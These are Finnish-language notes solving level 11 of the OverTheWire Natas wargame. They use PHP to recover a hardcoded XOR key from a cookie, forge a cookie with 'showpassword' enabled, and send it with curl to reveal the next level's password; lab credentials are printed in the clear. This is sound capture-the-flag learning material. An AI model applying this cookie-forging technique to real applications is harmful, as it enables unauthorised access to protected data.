$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D";
echo "Key = ";
echo xor_encrypt(base64_decode($cookie))

?>
```

Key = eDWo eDWo eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeL



same php script just small edit;; (CONTINUE)

xor_encrypt-funktion sis√§ll√§ oleva $key = "eDWo" on kovakoodattu avain, joka vaikuttaa salauksen lopputulokseen.

```
<?php

function xor_encrypt($in) {
    $key = "eDWo";
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt(json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))));

?>
```


HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5




## Level 11 - 3 muita ohjeita;

https://medium.com/@n01s/solving-natas-11-df246fcf7828

https://learnhacking.io/overthewire-natas-level-11-walkthrough/

https://www.youtube.com/watch?v=blNRSTBfyVA 

## Level 11 - 4 viimeinkin

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

Periaatteessa tuolla sivustolla muutettuna kun saadaan `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe=`
Niin t√§ss√§ on toistettu muutama `eDWo` ja jne jne, siksi kummottuna menn√§√§n t√§ll√§ sanalla siksi saadaan se virallinen XOR (`eDWo`) + To Base64 mentelm√§ns√§ ulos: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`


```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -b "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5" "http://natas11.natas.labs.overthewire.org"
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" };</script></head>

<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

---

# Level 12 - START HERE


natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB








